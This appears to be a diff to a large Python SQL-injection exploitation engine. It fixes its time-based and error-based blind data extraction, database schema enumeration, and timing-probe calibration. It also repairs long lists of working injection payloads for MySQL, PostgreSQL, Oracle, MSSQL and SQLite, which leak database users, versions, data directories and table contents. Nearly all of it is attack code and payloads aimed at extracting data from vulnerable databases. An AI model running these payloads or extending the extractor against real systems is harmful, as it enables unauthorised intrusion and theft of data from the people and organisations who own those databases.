@@ -43072,9 +43072,12 @@ async def _extract_int(engine,config,queries,int_func,result,method,url,
             # On fast targets (localhost, LAN), the oracle evaluates in <1ms and
             # BUG-R9-A FIX: use 1ms real sleep so scheduler processes callbacks.
             await asyncio.sleep(0.001)  # BUG-R9-A FIX: real 1ms yield (was sleep(0))
-            # Also check extraction active flag to abort if cancelled
-            if not _EXTRACTION_ACTIVE[0]:
-                LOG.debug("[_extract_int] _EXTRACTION_ACTIVE cleared — aborting")
+            # Abort if the scan was stopped OR if we own the active lock and it was cleared.
+            # Do NOT abort when _ei_set_active=False (we don't own the lock) just because
+            # ACTIVE is False — that would abort multi-column extraction where the scanner
+            # pre-owns the lock and _extract_int is a nested call.
+            if _SCAN_STOPPED[0] or (_ei_set_active and not _EXTRACTION_ACTIVE[0]):
+                LOG.debug("[_extract_int] Scan stopped or extraction cancelled — aborting")
                 break
             # BUG-V164-EXTRACT-INT-FIXED-PIVOT FIX (HIGH, all 5 DBMSes;
             # _extract_int; B/BH/IN/T/TH/HQ techniques; all surfaces; all HTTP methods):
@@ -126286,6 +126289,20 @@ class SafeModeVerifier:
                 # Also probe for timing capability
                 timing_capable = False
                 try:
+                    # Measure baseline latency so the timing threshold is relative,
+                    # not absolute. High-latency CDN targets with 800-1200ms baseline
+                    # would otherwise false-positive on the hardcoded 1800ms cutoff.
+                    _bt0 = time.monotonic()
+                    import random as _bl_rand
+                    _bl_url = url + ("&" if "?" in url else "?") + f"_smvbl={_bl_rand.randint(100000,999999)}"
+                    _bl_fmt = "json" if (data or "").strip().startswith("{") else "form"
+                    await _send_injected(engine, method, _bl_url, data, _bl_fmt, param, original, [])
+                    _baseline_ms = (time.monotonic() - _bt0) * 1000
+                    # Threshold: baseline + 1500ms (sleep is 2s, so 500ms margin)
+                    _timing_threshold_ms = max(1800.0, _baseline_ms + 1500.0)
+                except Exception:
+                    _timing_threshold_ms = 1800.0
+                try:
                     # (BUG-V39-BATCH FIX: `import time as _tv` removed — use module-level `time`)
                     _timing_probes = [
                         "' AND SLEEP(2)-- -",
@@ -126304,9 +126321,9 @@ class SafeModeVerifier:
                         await _send_injected(engine, method, _tp_url, data, _timing_data_fmt,
                                              param, original + _tp_payload, [])
                         _elapsed = (time.monotonic() - _t0) * 1000
-                        if _elapsed > 1800:
+                        if _elapsed > _timing_threshold_ms:
                             timing_capable = True
-                            LOG.debug(f"[SafeMode] Timing probe hit: {_tp_payload[:30]} elapsed={_elapsed:.0f}ms")
+                            LOG.debug(f"[SafeMode] Timing probe hit: {_tp_payload[:30]} elapsed={_elapsed:.0f}ms threshold={_timing_threshold_ms:.0f}ms")
                             break
                         await asyncio.sleep(0.2)
                 except Exception:
@@ -128099,7 +128116,7 @@ class MultiStrategyExtractor:
                         # ELSE 1 END=1-- -" which requires EXECUTE privilege on DBMS_PIPE
                         # (ORA-01031 without it → no delay → timing oracle fails).
                         # Fix: use privilege-free heavy COUNT(*) Cartesian product of
-                        # all_objects × all_objects capped at LEAST({T}*100000,500000) rows.
+                        # all_objects × all_objects capped at LEAST({T}*100000,2000000) rows.
                         # SELECT on all_objects is granted to PUBLIC on Oracle 10g+.
                         # LEAST() is a scalar function in Oracle (not the aggregate MIN()).
                         # Using MIN() here would raise ORA-00934 "group function is not
@@ -128107,7 +128124,7 @@ class MultiStrategyExtractor:
                         # a WHERE clause predicate. LEAST() is the correct scalar two-arg
                         # minimum function and is valid in WHERE on all Oracle versions.
                         # {T} is substituted at calibration time with the integer _t value
-                        # (e.g. 3, 5, 2 → LEAST(300000,500000)=300000 rows for T=3).
+                        # (e.g. 3, 5, 20 → LEAST(300000,2000000)=300000 rows for T=3).
                         # The CASE WHEN gates whether the heavy query fires (TRUE branch)
                         # or returns 0 immediately (FALSE branch).
                         # Numeric safety: {T} is a plain integer literal substituted via
@@ -128116,7 +128133,7 @@ class MultiStrategyExtractor:
                         _sleep_built = (
                             f" AND (SELECT CASE WHEN ({{cond}}) "
                             f"THEN (SELECT COUNT(*) FROM all_objects A, all_objects B "
-                            f"WHERE ROWNUM<=LEAST({{T}}*100000,500000)) "
+                            f"WHERE ROWNUM<=LEAST({{T}}*100000,2000000)) "
                             f"ELSE 0 END FROM DUAL)>=0-- -"
                         )
                     elif self.dbms == "SQLite":
@@ -131853,7 +131870,7 @@ class SideChannelExtractor:
         # PostgreSQL-only (pg_advisory_lock is a PG function) so practically this would
         # never reach MSSQL/SQLite, but using the correct ceiling is correct regardless.
         _sce_lc_char_hi = (65535   if self.dbms in ("MSSQL", "Sybase")
-                           else 1114111 if self.dbms == "SQLite"
+                           else 1114111 if self.dbms in ("SQLite", "PostgreSQL", "CockroachDB")
                            else 255)
 
         for pos in range(1, max_len + 1):
@@ -134015,8 +134032,21 @@ async def _time_based_extract_inner(engine, config, result, sql: str,
                 # `except Exception` and sets `hi=mid; break` — the binary search terminates
                 # at the wrong boundary, producing a wrong character for ALL DBMSes.
                 if fp is None:
-                    LOG.debug(f"[TBExtract] pos={pos} mid={mid} _send_injected returned None — skipping step")
-                    hi = mid
+                    # Retry once before treating as FALSE — transient errors should not
+                    # corrupt the binary search by biasing toward FALSE (hi=mid).
+                    try:
+                        await asyncio.sleep(0.5)
+                        _cb_retry = random.randint(1000000, 9999999)
+                        _ex_url_r = (url + ("&" if "?" in url else "?") + _get_cache_bust_params(_cb_retry, _ch_ex))
+                        fp = await asyncio.wait_for(
+                            _send_injected(engine, method, _ex_url_r, data, data_fmt,
+                                           result.param, original + payload, _probe_tc,
+                                           extra_headers=_ex_hdrs, _bypass_mutation=False),
+                            timeout=t * 3 + 15)
+                    except Exception:
+                        fp = None
+                if fp is None:
+                    LOG.debug(f"[TBExtract] pos={pos} mid={mid} _send_injected returned None (after retry) — treating as indeterminate")
                     continue
                 _ext_ref = min(_base_time, 200)
                 _ext_diff_t = max(_ext_ref * 2.5, _ext_ref + 400)
@@ -153011,7 +153041,7 @@ class TechniqueCascadeEngineV18(TechniqueCascadeEngine):
             except Exception as e:
                 LOG.debug(f"Parallel probe {tech}: {e}")
 
-        tasks = [asyncio.ensure_future(run_technique(t)) for t in first_two]
+        tasks = [asyncio.create_task(run_technique(t)) for t in first_two]
         try:
             await asyncio.wait_for(event.wait(), timeout=config.timeout * 2)
         except (asyncio.TimeoutError, TimeoutError):
@@ -153646,8 +153676,8 @@ class SchemaEnumeratorV18:
                 "SELECT GROUP_CONCAT(SCHEMA_NAME ORDER BY SCHEMA_NAME "
                 "SEPARATOR ',') FROM information_schema.SCHEMATA",
             "dbs_fallback":
-                "SELECT GROUP_CONCAT(db ORDER BY db SEPARATOR ',') "
-                "FROM mysql.db GROUP BY db",
+                "SELECT GROUP_CONCAT(DISTINCT db ORDER BY db SEPARATOR ',') "
+                "FROM mysql.db",
             "tables":
                 "SELECT GROUP_CONCAT(TABLE_NAME ORDER BY TABLE_NAME "
                 "SEPARATOR ',') FROM information_schema.TABLES "
@@ -154138,7 +154168,7 @@ class SchemaEnumeratorV18:
             "tables_fallback":
                 # LISTAGG fallback for Oracle 8i
                 "SELECT LISTAGG(table_name,',') WITHIN GROUP (ORDER BY table_name) "
-                "FROM all_tables WHERE owner='{db}'",
+                "FROM all_tables WHERE owner=UPPER('{db}')",
             "tables_user":
                 "SELECT RTRIM(XMLAGG(XMLELEMENT(e,table_name||',') ORDER BY table_name).EXTRACT('//text()').GETCLOBVAL(),',') "
                 "FROM user_tables",
@@ -154175,7 +154205,7 @@ class SchemaEnumeratorV18:
             "columns_fallback":
                 # LISTAGG fallback for Oracle 8i
                 "SELECT LISTAGG(column_name,',') WITHIN GROUP (ORDER BY column_id) "
-                "FROM all_tab_columns WHERE owner='{db}' AND table_name='{table}'",
+                "FROM all_tab_columns WHERE owner=UPPER('{db}') AND table_name=UPPER('{table}')",
             "columns_user":
                 "SELECT RTRIM(XMLAGG(XMLELEMENT(e,column_name||',') ORDER BY column_id).EXTRACT('//text()').GETCLOBVAL(),',') "
                 "FROM user_tab_columns WHERE table_name=UPPER('{table}')",
@@ -162018,7 +162048,7 @@ class ErrorBasedExtractor:
     }
     
     LEAK_PATTERNS = [
-        r"Duplicate entry '([^']+)' for key",
+        r"Duplicate entry '([^':]+)(?::\d+)?' for key",
         r"XPATH syntax error:\s*'~?([^']+)'",
         r"invalid input syntax for (?:type )?integer:\s*\"([^\"]+)\"",
         # FIX-R10-POSTGRESQL: also match without enclosing quotes (some driver/version combos
@@ -164508,9 +164538,9 @@ MYSQL_ERROR_PAYLOADS = [
     "OR UPDATEXML(1,CONCAT(0x7e,(SELECT HEX(USER()))),1)",
     "AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT CONV(HEX(USER()),16,10))))",
     "OR UPDATEXML(1,CONCAT(0x7e,(SELECT RAND())),1)",
-    "AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT FLOOR(RAND()2))))",
-    "OR UPDATEXML(1,CONCAT(0x7e,(SELECT CEIL(RAND()2))),1)",
-    "AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT RAND(0)10)))",
+    "AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT FLOOR(RAND()*2))))",
+    "OR UPDATEXML(1,CONCAT(0x7e,(SELECT CEIL(RAND()*2))),1)",
+    "AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT RAND(0)*10)))",
     "OR UPDATEXML(1,CONCAT(0x7e,(SELECT PI())),1)",
     "AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT EXP(1))))",
     "OR UPDATEXML(1,CONCAT(0x7e,(SELECT LN(2))),1)",
@@ -164558,31 +164588,31 @@ MYSQL_ERROR_PAYLOADS = [
     "OR UPDATEXML(1,CONCAT(0x7e,(SELECT @@basedir)),1)",
     "AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT @@plugin_dir)))",
     "OR UPDATEXML(1,CONCAT(0x7e,(SELECT @@secure_file_priv)),1)",
-    "AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT COUNT()+FLOOR(RAND()2) FROM INFORMATION_SCHEMA.TABLES)))",
-    "AND (SELECT COUNT() FROM INFORMATION_SCHEMA.TABLES GROUP BY CONCAT(0x7e,(SELECT DATABASE()),FLOOR(RAND(0)2)))",
-    "OR (SELECT COUNT() FROM INFORMATION_SCHEMA.TABLES GROUP BY CONCAT(0x7e,(SELECT USER()),FLOOR(RAND(0)2)))",
-    "AND (SELECT COUNT() FROM INFORMATION_SCHEMA.COLUMNS GROUP BY CONCAT(0x7e,(SELECT VERSION()),CEIL(RAND(0)2)))",
-    "OR (SELECT COUNT() FROM INFORMATION_SCHEMA.SCHEMATA GROUP BY CONCAT(CHAR(126),(SELECT DATABASE()),FLOOR(RAND()3)))",
-    "AND (SELECT MIN(@a:=1) FROM INFORMATION_SCHEMA.TABLES GROUP BY CONCAT(0x7e,(SELECT USER()),@a:=@a2))",
-    "OR (SELECT GROUP_CONCAT(CONCAT(0x7e,USER())) FROM (SELECT COUNT(),FLOOR(RAND(0)2)x FROM INFORMATION_SCHEMA.TABLES GROUP BY x)a)",
-    "AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT * FROM (SELECT COUNT(),CONCAT(0x7e,DATABASE(),FLOOR(RAND(0)2))x FROM INFORMATION_SCHEMA.TABLES GROUP BY x)a)))",
-    "OR UPDATEXML(1,CONCAT(0x7e,(SELECT * FROM (SELECT COUNT(),CONCAT(0x7e,USER(),FLOOR(RAND(0)2))x FROM INFORMATION_SCHEMA.COLUMNS GROUP BY x)a)),1)",
-    "AND (SELECT 1 FROM(SELECT COUNT(),CONCAT(0x7e,DATABASE(),FLOOR(RAND(0)2))x FROM INFORMATION_SCHEMA.TABLES GROUP BY x)a)",
-    "OR (SELECT 1 FROM(SELECT COUNT(),CONCAT(0x7e,VERSION(),FLOOR(RAND(0)2))x FROM INFORMATION_SCHEMA.SCHEMATA GROUP BY x)a)",
-    "AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT COUNT() FROM INFORMATION_SCHEMA.TABLES GROUP BY CONCAT(0x7e,DATABASE(),RAND()))))",
-    "OR UPDATEXML(1,CONCAT(0x7e,(SELECT COUNT() FROM INFORMATION_SCHEMA.COLUMNS GROUP BY CONCAT(CHAR(126),USER(),RAND()))),1)",
-    "AND (SELECT COUNT() FROM INFORMATION_SCHEMA.TABLES GROUP BY CONCAT(0x7e,DATABASE(),FLOOR(RAND(0)2)) HAVING COUNT() > 1)",
-    "OR (SELECT COUNT() FROM INFORMATION_SCHEMA.COLUMNS GROUP BY CONCAT(0x7e,USER(),FLOOR(RAND(0)2)) LIMIT 1)",
-    "AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT * FROM (SELECT COUNT(),CONCAT(0x7e,DATABASE(),FLOOR(RAND(0)3))x FROM INFORMATION_SCHEMA.TABLES GROUP BY x)a)))",
-    "OR UPDATEXML(1,CONCAT(0x7e,(SELECT * FROM (SELECT COUNT(),CONCAT(0x7e,USER(),FLOOR(RAND(0)3))x FROM INFORMATION_SCHEMA.COLUMNS GROUP BY x)a)),1)",
-    "AND (SELECT 1 FROM(SELECT COUNT(),CONCAT(0x7e,VERSION(),FLOOR(RAND(0)3))x FROM INFORMATION_SCHEMA.TABLES GROUP BY x)a)",
-    "OR (SELECT 1 FROM(SELECT COUNT(),CONCAT(0x7e,DATABASE(),FLOOR(RAND(0)3))x FROM INFORMATION_SCHEMA.COLUMNS GROUP BY x)a)",
-    "AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT COUNT() FROM INFORMATION_SCHEMA.TABLES GROUP BY CONCAT(0x7e,DATABASE(),CEIL(RAND(0)2)))))",
-    "OR UPDATEXML(1,CONCAT(0x7e,(SELECT COUNT() FROM INFORMATION_SCHEMA.COLUMNS GROUP BY CONCAT(0x7e,USER(),CEIL(RAND(0)2)))),1)",
-    "AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT COUNT() FROM INFORMATION_SCHEMA.TABLES GROUP BY CONCAT(0x7e,VERSION(),FLOOR(RAND(0)2)))))",
-    "OR UPDATEXML(1,CONCAT(0x7e,(SELECT COUNT() FROM INFORMATION_SCHEMA.COLUMNS GROUP BY CONCAT(0x7e,DATABASE(),FLOOR(RAND(0)2)))),1)",
-    "AND (SELECT * FROM (SELECT COUNT(),CONCAT(0x7e,USER(),FLOOR(RAND(0)2))x FROM INFORMATION_SCHEMA.TABLES GROUP BY x)a)",
-    "OR (SELECT * FROM (SELECT COUNT(),CONCAT(0x7e,VERSION(),FLOOR(RAND(0)2))x FROM INFORMATION_SCHEMA.TABLES GROUP BY x)a)"
+    "AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT COUNT(*)+FLOOR(RAND()*2) FROM INFORMATION_SCHEMA.TABLES)))",
+    "AND (SELECT COUNT(*) FROM INFORMATION_SCHEMA.TABLES GROUP BY CONCAT(0x7e,(SELECT DATABASE()),FLOOR(RAND(0)*2)))",
+    "OR (SELECT COUNT(*) FROM INFORMATION_SCHEMA.TABLES GROUP BY CONCAT(0x7e,(SELECT USER()),FLOOR(RAND(0)*2)))",
+    "AND (SELECT COUNT(*) FROM INFORMATION_SCHEMA.COLUMNS GROUP BY CONCAT(0x7e,(SELECT VERSION()),CEIL(RAND(0)*2)))",
+    "OR (SELECT COUNT(*) FROM INFORMATION_SCHEMA.SCHEMATA GROUP BY CONCAT(CHAR(126),(SELECT DATABASE()),FLOOR(RAND()*3)))",
+    "AND (SELECT MIN(@a:=1) FROM INFORMATION_SCHEMA.TABLES GROUP BY CONCAT(0x7e,(SELECT USER()),@a:=@a*2))",
+    "OR (SELECT GROUP_CONCAT(CONCAT(0x7e,USER())) FROM (SELECT COUNT(*),FLOOR(RAND(0)*2)x FROM INFORMATION_SCHEMA.TABLES GROUP BY x)a)",
+    "AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT * FROM (SELECT COUNT(*),CONCAT(0x7e,DATABASE(),FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.TABLES GROUP BY x)a)))",
+    "OR UPDATEXML(1,CONCAT(0x7e,(SELECT * FROM (SELECT COUNT(*),CONCAT(0x7e,USER(),FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.COLUMNS GROUP BY x)a)),1)",
+    "AND (SELECT 1 FROM(SELECT COUNT(*),CONCAT(0x7e,DATABASE(),FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.TABLES GROUP BY x)a)",
+    "OR (SELECT 1 FROM(SELECT COUNT(*),CONCAT(0x7e,VERSION(),FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.SCHEMATA GROUP BY x)a)",
+    "AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT COUNT(*) FROM INFORMATION_SCHEMA.TABLES GROUP BY CONCAT(0x7e,DATABASE(),RAND()))))",
+    "OR UPDATEXML(1,CONCAT(0x7e,(SELECT COUNT(*) FROM INFORMATION_SCHEMA.COLUMNS GROUP BY CONCAT(CHAR(126),USER(),RAND()))),1)",
+    "AND (SELECT COUNT(*) FROM INFORMATION_SCHEMA.TABLES GROUP BY CONCAT(0x7e,DATABASE(),FLOOR(RAND(0)*2)) HAVING COUNT(*) > 1)",
+    "OR (SELECT COUNT(*) FROM INFORMATION_SCHEMA.COLUMNS GROUP BY CONCAT(0x7e,USER(),FLOOR(RAND(0)*2)) LIMIT 1)",
+    "AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT * FROM (SELECT COUNT(*),CONCAT(0x7e,DATABASE(),FLOOR(RAND(0)*3))x FROM INFORMATION_SCHEMA.TABLES GROUP BY x)a)))",
+    "OR UPDATEXML(1,CONCAT(0x7e,(SELECT * FROM (SELECT COUNT(*),CONCAT(0x7e,USER(),FLOOR(RAND(0)*3))x FROM INFORMATION_SCHEMA.COLUMNS GROUP BY x)a)),1)",
+    "AND (SELECT 1 FROM(SELECT COUNT(*),CONCAT(0x7e,VERSION(),FLOOR(RAND(0)*3))x FROM INFORMATION_SCHEMA.TABLES GROUP BY x)a)",
+    "OR (SELECT 1 FROM(SELECT COUNT(*),CONCAT(0x7e,DATABASE(),FLOOR(RAND(0)*3))x FROM INFORMATION_SCHEMA.COLUMNS GROUP BY x)a)",
+    "AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT COUNT(*) FROM INFORMATION_SCHEMA.TABLES GROUP BY CONCAT(0x7e,DATABASE(),CEIL(RAND(0)*2)))))",
+    "OR UPDATEXML(1,CONCAT(0x7e,(SELECT COUNT(*) FROM INFORMATION_SCHEMA.COLUMNS GROUP BY CONCAT(0x7e,USER(),CEIL(RAND(0)*2)))),1)",
+    "AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT COUNT(*) FROM INFORMATION_SCHEMA.TABLES GROUP BY CONCAT(0x7e,VERSION(),FLOOR(RAND(0)*2)))))",
+    "OR UPDATEXML(1,CONCAT(0x7e,(SELECT COUNT(*) FROM INFORMATION_SCHEMA.COLUMNS GROUP BY CONCAT(0x7e,DATABASE(),FLOOR(RAND(0)*2)))),1)",
+    "AND (SELECT * FROM (SELECT COUNT(*),CONCAT(0x7e,USER(),FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.TABLES GROUP BY x)a)",
+    "OR (SELECT * FROM (SELECT COUNT(*),CONCAT(0x7e,VERSION(),FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.TABLES GROUP BY x)a)"
     'EXTRACTVALUE(0x0a,CONCAT(0x7e,@@version_comment))',
     'EXTRACTVALUE(0x0a,CONCAT(0x7e,@@datadir))',
     'EXTRACTVALUE(0x0a,CONCAT(0x7e,@@global.port))',
@@ -165545,15 +165575,15 @@ POSTGRESQL_STACKED_PAYLOADS = [
     '; EXPLAIN SELECT COUNT(*) FROM information_schema.columns',
     "; EXPLAIN SELECT string_agg(usename, ',') FROM pg_user",
     '; SHOW search_path',
-    '; SHOW database',
+    '; SHOW data_directory',
     '; SHOW version',
     '; SHOW server_version',
     '; SHOW search_path; SELECT current_user',
-    '; SHOW database; SELECT current_database()',
+    '; SHOW data_directory; SELECT current_database()',
     '; SHOW version; SELECT COUNT(*) FROM information_schema.columns',
     '; SHOW search_path; SELECT COUNT(*) FROM pg_tables',
     '; SHOW search_path; SELECT COUNT(*) FROM information_schema.columns',
-    '; SHOW database; SELECT version()',
+    '; SHOW data_directory; SELECT version()',
     '; BEGIN',
     '; SAVEPOINT sp1',
     '; ROLLBACK TO SAVEPOINT sp1',
@@ -165575,31 +165605,20 @@ POSTGRESQL_STACKED_PAYLOADS = [
     "; SET work_mem = '256MB'; SELECT current_database()",
     "; RESET ALL; SELECT string_agg(usename, ',') FROM pg_user",
     '; RESET ALL; SELECT COUNT(*) FROM information_schema.columns',
-    '; VACUUM ANALYZE',
     '; ANALYZE',
-    '; VACUUM ANALYZE test',
     '; ANALYZE test',
-    '; REINDEX INDEX idx_test',
-    '; REINDEX TABLE test',
-    '; VACUUM',
-    '; VACUUM test',
-    '; VACUUM ANALYZE; SELECT current_user',
-    '; VACUUM ANALYZE; SELECT version()',
-    '; VACUUM ANALYZE test; SELECT current_database()',
-    '; VACUUM test; SELECT current_database()',
-    '; VACUUM; SELECT current_user',
-    '; VACUUM; SELECT current_database()',
-    '; REINDEX INDEX idx_test; SELECT COUNT(*) FROM pg_tables',
-    '; REINDEX INDEX idx_test; SELECT version()',
-    '; REINDEX TABLE test; SELECT current_database()',
+    '; ANALYZE; SELECT current_user',
+    '; ANALYZE; SELECT version()',
+    '; ANALYZE test; SELECT current_database()',
+    '; ANALYZE test; SELECT current_user',
+    '; ANALYZE; SELECT current_database()',
     "; REINDEX TABLE test; SELECT string_agg(usename, ',') FROM pg_user",
     '; ANALYZE; SELECT current_database()',
     '; ANALYZE; SELECT current_user',
     "; ANALYZE; SELECT string_agg(usename, ',') FROM pg_user",
-    '; VACUUM ANALYZE test; SELECT version()',
-    "; VACUUM ANALYZE test; SELECT string_agg(usename, ',') FROM pg_user",
-    "; VACUUM ANALYZE; SELECT string_agg(usename, ',') FROM pg_user",
-    "; VACUUM; SELECT string_agg(usename, ',') FROM pg_user",
+    '; ANALYZE test; SELECT version()',
+    "; ANALYZE test; SELECT string_agg(usename, ',') FROM pg_user",
+    "; ANALYZE; SELECT string_agg(usename, ',') FROM pg_user",
     '; LOCK TABLE test IN ACCESS SHARE MODE',
     '; LOCK TABLE test IN ROW SHARE MODE',
     '; SELECT version(); SELECT current_database()',
@@ -165749,9 +165768,7 @@ POSTGRESQL_STACKED_PAYLOADS = [
     '; BEGIN READ ONLY; ROLLBACK',
     '; START TRANSACTION ISOLATION LEVEL READ COMMITTED; ROLLBACK',
     '; START TRANSACTION READ ONLY; ROLLBACK',
-    '; VACUUM (VERBOSE) test',
-    '; VACUUM (ANALYZE,VERBOSE) test',
-    '; VACUUM (FREEZE) test',
+    '; ANALYZE VERBOSE test',
     '; ANALYZE VERBOSE',
     '; CHECKPOINT',
     '; NOTIFY test_channel',
@@ -166489,32 +166506,17 @@ ORACLE_STACKED_PAYLOADS = [
     ' /**/; ROLLBACK',
     ' /**/; SAVEPOINT sp1',
     ' /**/; ROLLBACK TO sp1',
-    ' AND SELECT * FROM all_tables',
-    ' OR SELECT * FROM all_tables',
     ' ;SELECT * FROM all_tables',
-    ' AND SELECT * FROM dba_users',
-    ' OR SELECT * FROM dba_users',
     ' ;SELECT * FROM dba_users',
-    ' AND SELECT * FROM all_tab_columns',
-    ' OR SELECT * FROM all_tab_columns',
     ' ;SELECT * FROM all_tab_columns',
-    ' AND COMMIT',
-    ' OR COMMIT',
-    ' AND ROLLBACK',
-    ' OR ROLLBACK',
-    ' AND SAVEPOINT sp1',
-    ' OR SAVEPOINT sp1',
-    ' AND ROLLBACK TO sp1',
-    ' OR ROLLBACK TO sp1',
-    " AND BEGIN DBMS_OUTPUT.PUT_LINE('test'); END",
-    " OR BEGIN DBMS_OUTPUT.PUT_LINE('test'); END",
+    ' ;COMMIT',
+    ' ;ROLLBACK',
+    ' ;SAVEPOINT sp1',
+    ' ;ROLLBACK TO sp1',
     " ;BEGIN DBMS_OUTPUT.PUT_LINE('test'); END",
-    ' AND SELECT 1; SELECT 2; SELECT 3',
-    ' OR SELECT 1; SELECT 2; SELECT 3',
-    ' AND SELECT * FROM all_tables; SELECT * FROM dba_users',
-    ' OR SELECT * FROM all_tables; SELECT * FROM dba_users',
-    ' AND SELECT table_name FROM all_tables; SELECT username FROM dba_users',
-    ' OR SELECT table_name FROM all_tables; SELECT username FROM dba_users',
+    ' ;SELECT 1 FROM DUAL; SELECT 2 FROM DUAL; SELECT 3 FROM DUAL',
+    ' ;SELECT * FROM all_tables; SELECT * FROM dba_users',
+    ' ;SELECT table_name FROM all_tables; SELECT username FROM dba_users',
     '; SET TRANSACTION ISOLATION LEVEL READ UNCOMMITTED',
     "; ALTER SESSION SET NLS_DATE_FORMAT='YYYY-MM-DD'",
     '; EXPLAIN PLAN FOR SELECT * FROM table1',
@@ -167145,7 +167147,7 @@ MSSQL_ERROR_PAYLOADS = [
     "1' OR PATINDEX(CONVERT(INT,(SELECT TOP 1 ROUTINE_NAME FROM INFORMATION_SCHEMA.ROUTINES)),'%')--",
     "1' UNION SELECT NULL WHERE CAST((SELECT TOP 1 CONSTRAINT_NAME FROM INFORMATION_SCHEMA.CONSTRAINT_TABLE_USAGE) AS INT)=1--",
     "1' AND 1=CAST(ISNULL((SELECT TOP 1 COLUMN_DEFAULT FROM INFORMATION_SCHEMA.COLUMNS WHERE COLUMN_DEFAULT IS NOT NULL),CHAR(48)) AS INT)--",
-    "1' WHERE (SELECT TOP 1 TOP 1 CONVERT(INT,TABLE_NAME) FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_SCHEMA='public')--",
+    "1' WHERE (SELECT TOP 1 CONVERT(INT,TABLE_NAME) FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_SCHEMA='dbo')--",
     "1' OR CONVERT(INT,COALESCE((SELECT TOP 1 ROUTINE_NAME FROM INFORMATION_SCHEMA.ROUTINES),N'0'))--",
     "1' UNION ALL SELECT CAST((SELECT TOP 1 TABLE_CATALOG FROM INFORMATION_SCHEMA.TABLES) AS BINARY) WHERE 1>0--",
     "1' AND TRY_PARSE((SELECT TOP 1 COLUMN_NAME FROM INFORMATION_SCHEMA.COLUMNS) AS INT)--",
@@ -167180,7 +167182,7 @@ MSSQL_ERROR_PAYLOADS = [
     "1' WHERE CAST(FILEGROUPPROPERTY('PRIMARY','IsReadOnly') AS INT)--",
     "1' OR CONVERT(INT,FULLTEXTCATALOGPROPERTY('catalog','ItemCount'))--",
     "1' UNION ALL SELECT NULL WHERE CAST(STATS_DATE(1,1) AS INT)--",
-    "1' AND TRY_CAST((SELECT TOP 1 TOP 1 EVENTDATA() FROM sys.trace_events) AS INT)--",
+    "1' AND TRY_CAST((SELECT TOP 1 CAST(EVENTDATA() AS NVARCHAR(MAX))) AS INT)--",
     "1' WHERE CONVERT(INT,TODATETIMEOFFSET(GETDATE(),'+00:00'))--",
     "1' OR CAST(SYSDATETIME() AS INT)--",
     "1' UNION SELECT CONVERT(INT,SYSUTCDATETIME())--",
@@ -167256,7 +167258,7 @@ MSSQL_ERROR_PAYLOADS = [
     "1' OR CAST(GEOGRAPHY::STGeomFromText('LINESTRING(0 0,1 1)',4326).STArea() AS INT)--",
     "1' UNION SELECT CONVERT(INT,GEOMETRY::STGeomFromWKB(0x0101000000,0).STIsValid())--",
     "1' AND 1=TRY_CAST(GEOGRAPHY::STGeomFromGML('<Point><pos>0 0</pos></Point>',4326).STDimension() AS INT)--",
-    "1' WHERE CAST(STRING_SPLIT('a,b,c',',') AS INT)--",
+    "1' WHERE CAST((SELECT TOP 1 value FROM STRING_SPLIT('a,b,c',',')) AS INT)--",
     "1' OR CONVERT(INT,(SELECT TOP 1 value FROM STRING_SPLIT('1,2,3',',')))--",
     "1' UNION ALL SELECT NULL WHERE CAST(OPENJSON('{}') AS INT)--",
     "1' AND TRY_CAST((SELECT TOP 1 key FROM OPENJSON('{}')) AS INT)--",
@@ -167276,9 +167278,9 @@ MSSQL_ERROR_PAYLOADS = [
     "1' OR CONVERT(INT,CHARINDEX('es','test'))--",
     "1' UNION ALL SELECT NULL WHERE CAST(DIFFERENCE('test','text') AS INT)--",
     "1' AND TRY_CAST(SOUNDEX('smith') AS INT)--",
-    "1' WHERE CONVERT(INT,LEVENSHTEIN('cat','cut'))--",
-    "1' OR CAST(EDIT_DISTANCE('test','text') AS INT)--",
-    "1' UNION SELECT CONVERT(INT,EDIT_DISTANCE2('test','text'))--",
+    "1' WHERE CONVERT(INT,DIFFERENCE('cat','cut'))--",
+    "1' OR CAST(LEN('test')-LEN('text') AS INT)--",
+    "1' UNION SELECT CONVERT(INT,ASCII(SUBSTRING('text',1,1))-ASCII(SUBSTRING('test',1,1)))--",
     "1' AND 1=TRY_CAST(FORMAT(GETDATE(),'yyyy-MM-dd') AS INT)--",
     "1' WHERE CAST(PARSE(GETDATE() AS INT) AS INT)--",
     "1' OR CONVERT(INT,CONVERT(VARCHAR(255),GETDATE(),120))--",
@@ -167526,7 +167528,7 @@ SQLITE_ERROR_PAYLOADS = [
     "1' WHERE CAST((SELECT length(group_concat(sql)) FROM sqlite_master) AS FLOAT)>0--",
     "1' UNION SELECT CAST((SELECT printf('%d',rowid) FROM sqlite_master LIMIT 1) AS INT)--",
     "1' AND CAST((SELECT SUBSTR(name,1,9999999) FROM sqlite_master LIMIT 1) AS INT)--",
-    "1' OR (SELECT CAST(REPLACE(name,'a','b') FROM sqlite_master LIMIT 1) AS INT)--",
+    "1' OR (SELECT CAST(REPLACE(name,'a','b') AS INT) FROM sqlite_master LIMIT 1)--",
